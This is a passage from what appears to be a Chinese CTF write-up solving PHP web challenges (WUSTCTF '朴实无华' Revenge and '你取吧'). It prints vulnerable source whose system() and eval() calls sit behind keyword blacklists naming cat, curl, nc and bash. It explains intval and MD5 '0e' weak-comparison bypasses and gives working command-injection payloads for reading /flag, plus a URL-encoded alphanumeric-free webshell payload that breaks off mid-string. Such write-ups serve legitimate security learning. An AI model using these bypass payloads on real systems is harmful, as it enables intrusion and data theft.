class="token punctuation">(</span><span class="token string double-quoted-string">"$"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"curl"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nc"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bash"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br>"</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"快到非洲了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>先一层层绕过，首先第一个<code>if</code>，传入num，简单来说就是</p><ul><li>num结果取整后和原来的字符串需要相等，但是这里只需要<code>==</code>即可</li><li>num需要为数字，取整后的数字不能小于-999999999999999999或者大于999999999999999999</li><li>num在经过取整和反转字符串后取整后的数字需要相等</li><li>num经过<code>isPalindrome</code>函数返回的值需要为<code>false</code></li></ul><p>再来看看<code>isPalindrome</code>函数，字符串两边对称的数字需要有不一样，才能使<code>$l=0</code>，返回<code>false</code>这样与前面的条件就矛盾了，反转后又需要相等，又不能对称。</p><p>以下提供两种绕过方式：</p><pre class="language-none"><code class="language-none">00.01000000000000000.00000000000000010</code></pre><p>第一种确实是没有任何操作就直接绕过了，而第二种则是浮点数的精度问题，在服务器上</p><p><code>var_dump(intval(1000000000000000.00000000000000010) === intval(strrev(1000000000000000.00000000000000010)));</code></p><p>是可以返回true的，但是我在本地测试到</p><p><code>var_dump(intval(1000000.00000010) === intval(strrev(1000000.00000010)));</code></p><p>就返回false了，不知道什么鬼-.-</p><p>再绕过第二个if</p><p>这个需要让<code>$md5==md5(md5($md5))</code>，弱比较，绕如果md5=0exxxxxxxx，经过两次md5加密后的md5值也为0exxxxxxxx，即可绕过</p><p>写个脚本爆破即可，这样的字符串挺多的，以下列举几个：</p><pre class="language-none"><code class="language-none">0e3900184182-&gt;0e1418721190302697727652753637950e6201668706-&gt;0e7985422574949326206502419486330e6702291282-&gt;0e1005063503807650968114418218160e1808236718-&gt;0e9355671365452205537103932527520e9507776345-&gt;0e8846062744707241436539484045430e7208324299-&gt;0e0296373600831971546521412019920e2010692162-&gt;0e5148989988791743362037461270580e9410970854-&gt;0e4302790236499053907065604760830e3511282263-&gt;0e657335831331991043075342997270</code></pre><p>再到最后get flag</p><p>过滤了挺多的命令，但是还是可以绕过：</p><pre class="language-shell" data-language="shell"><code class="language-shell">nl<span class="token operator">&lt;</span>/flag<span class="token operator">|</span><span class="token function">nl</span>rev<span class="token operator">&lt;</span>/flag<span class="token operator">|</span><span class="token function">rev</span></code></pre><p>随后即可拿到flag</p><h3 id="WEB-WUSTCTF朴实无华Revenge-Revenge"><a href="#WEB-WUSTCTF朴实无华Revenge-Revenge" class="headerlink" title="WEB_WUSTCTF朴实无华Revenge_Revenge"></a>WEB_WUSTCTF朴实无华Revenge_Revenge</h3><p>源码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$len</span><span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token variable">$k</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token variable">$k</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$j</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$len</span><span class="token operator">-</span><span class="token variable">$j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$l</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//level 1</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$numPositve</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$numReverse</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^0-9.]/'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"非洲欢迎你1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\./"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\-/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\-/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[-]/'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"没有这样的数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$num</span> <span class="token operator">!=</span> <span class="token variable">$numPositve</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$numPositve</span> <span class="token operator">&lt;=</span> <span class="token operator">-</span><span class="token number">999999999999999999</span> <span class="token operator">||</span> <span class="token variable">$numPositve</span> <span class="token operator">>=</span> <span class="token number">999999999999999999</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//在64位系统中 intval()的上限不是2147483647 省省吧</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"非洲欢迎你2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$numPositve</span> <span class="token operator">===</span> <span class="token variable">$numReverse</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"金钱解决不了穷人的本质问题"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//level 2</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$md5</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//get flag</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">,</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"more"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tail"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"less"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"head"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tac"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nl"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"$"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"curl"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bash"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nc"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/['\*\"[?]/"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'非预期修复*2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br>"</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"快到非洲了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>这题和上题差不多，只是最后的命令多过滤了一些，直接给出payload：</p><pre class="language-none"><code class="language-none">?num&#x3D;1000000000000000.00000000000000010&amp;md5&#x3D;0e2010692162&amp;get_flag&#x3D;ca\t&lt;flag.ph\p</code></pre><h3 id="WEB-你取吧"><a href="#WEB-你取吧" class="headerlink" title="WEB_你取吧"></a>WEB_你取吧</h3><p>源码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hint</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://filter/read=convert.base64-encode/resource=hhh.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'e'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'g'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'h'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'i'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'j'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'k'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'l'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'o'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'q'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'t'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'v'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'y'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'z'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\~'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blacklisted</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blacklisted</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/im'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo(<span class="token interpolation"><span class="token variable">$code</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>直接给出P神的payload(无字母数字的RCE)：</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p><p>GET：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>code<span class="token operator">=</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span 